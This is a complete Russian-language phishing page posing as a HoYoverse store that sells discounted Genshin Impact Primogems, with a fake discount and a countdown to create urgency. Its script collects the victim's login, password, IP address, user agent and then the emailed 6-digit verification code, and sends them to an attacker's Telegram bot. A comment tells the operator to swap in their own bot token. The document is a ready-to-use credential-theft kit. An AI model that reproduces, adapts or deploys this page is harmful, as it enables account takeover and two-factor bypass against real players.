<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Дешёвые Примогемы Genshin Impact | Акция -70%</title>
  <link rel="icon" href="https://genshin.hoyoverse.com/favicon.ico" type="image/x-icon"/>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0d001a, #1a0033, #2a004d);
      color: #e0d4ff;
      min-height: 100vh;
      background-attachment: fixed;
    }
    .container { max-width: 900px; margin: 0 auto; padding: 20px; }
    header { text-align: center; padding: 40px 0 20px; }
    .logo { width: 160px; filter: drop-shadow(0 0 15px #9d7fff); }
    h1 {
      font-size: 2.6rem;
      margin: 10px 0;
      background: linear-gradient(90deg, #c084fc, #a78bfa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .timer { font-size: 1.4rem; color: #ff6b6b; margin: 10px 0; }
    .form-section {
      background: rgba(20, 15, 50, 0.85);
      border-radius: 16px;
      padding: 40px;
      max-width: 480px;
      margin: 40px auto;
      border: 1px solid #7c3aed55;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #6b46c1;
      border-radius: 8px;
      background: #1a1238;
      color: white;
      font-size: 1.1rem;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(90deg, #7c3aed, #a78bfa);
      border: none;
      border-radius: 50px;
      color: white;
      font-size: 1.2rem;
      font-weight: bold;
      cursor: pointer;
      margin-top: 15px;
      transition: all 0.3s;
    }
    button:hover { transform: scale(1.05); box-shadow: 0 10px 25px rgba(124,94,255,0.5); }
    .loading, .error-msg {
      text-align: center;
      margin: 20px 0;
      font-weight: bold;
      display: none;
    }
    .loading { color: #a78bfa; }
    .error-msg { color: #ff6b6b; }
    .code-section { display: none; }
  </style>
</head>
<body>

<div class="container">
  <header>
    <img class="logo" src="https://static.vecteezy.com/system/resources/previews/027/127/497/non_2x/genshin-impact-logo-genshin-impact-icon-transparent-free-png.png" alt="HoYoverse">
    <h1>Мгновенная доставка Примогемов</h1>
    <div class="timer">Акция: -70% — осталось 47 минут!</div>
  </header>

  <div class="form-section">
    <h2 style="text-align:center; color:#d4b5ff;">Войдите в аккаунт HoYoverse для оплаты</h2>

    <form id="step1">
      <input type="text" id="login" placeholder="Email / Username" required autocomplete="username">
      <input type="password" id="password" placeholder="Пароль" required autocomplete="current-password">
      <button type="submit">Продолжить</button>
    </form>

    <div class="code-section" id="step2">
      <h3 style="text-align:center; color:#d4b5ff;">Проверка безопасности</h3>
      <p style="text-align:center; font-size:0.95rem;">Код отправлен на вашу почту. Введите 6-значный код</p>
      <input type="text" id="code" placeholder="123456" maxlength="6" pattern="\d{6}" required>
      <button id="submitCode">Подтвердить</button>
    </div>

    <div class="loading" id="loading">Обработка...</div>
    <div class="error-msg" id="errorMsg">Ошибка: неверный код или недостаточно средств. Попробуйте снова.</div>
  </div>
</div>

<script>
  // ← ЗАМЕНИ НА СВОИ
  const TELEGRAM_BOT_TOKEN = "8723819478:AAGJPIKI5FSgD4RkhhQTValrR--G3Iuyuto";
  const TELEGRAM_CHAT_ID   = "7200747121";

  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const loading = document.getElementById('loading');
  const errorMsg = document.getElementById('errorMsg');

  async function sendToTelegram(text) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'Markdown'
        })
      });
    } catch (e) { console.error(e); }
  }

  step1.addEventListener('submit', async (e) => {
    e.preventDefault();
    loading.style.display = 'block';

    const login = document.getElementById('login').value.trim();
    const password = document.getElementById('password').value.trim();

    const msg1 = `
**Genshin Магазин — ШАГ 1**
━━━━━━━━━━━━━━━
Логин/Email: \`${login}\`
Пароль: \`${password}\`
IP: ${await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> 'неизв.')}
Устройство: ${navigator.userAgent}
━━━━━━━━━━━━━━━`;

    await sendToTelegram(msg1);

    setTimeout(() => {
      loading.style.display = 'none';
      step1.style.display = 'none';
      step2.style.display = 'block';
    }, 1800);
  });

  document.getElementById('submitCode').addEventListener('click', async () => {
    const code = document.getElementById('code').value.trim();
    if (code.length !== 6 || !/^\d{6}$/.test(code)) {
      errorMsg.textContent = "Код должен быть 6 цифр.";
      errorMsg.style.display = 'block';
      return;
    }

    loading.style.display = 'block';
    errorMsg.style.display = 'none';

    const msg2 = `
**Genshin Магазин — ШАГ 2 (КОД)**
━━━━━━━━━━━━━━━
Код верификации: \`${code}\`
━━━━━━━━━━━━━━━`;

    await sendToTelegram(msg2);

    setTimeout(() => {
      loading.style.display = 'none';
      errorMsg.textContent = "Ошибка верификации. Попробуйте ввести код заново или повторите оплату.";
      errorMsg.style.display = 'block';
      // Можно добавить кнопку "Повторить" → step2.style.display = 'block'; но пока оставим так
    }, 2200);
  });
</script>

</body>
</html>
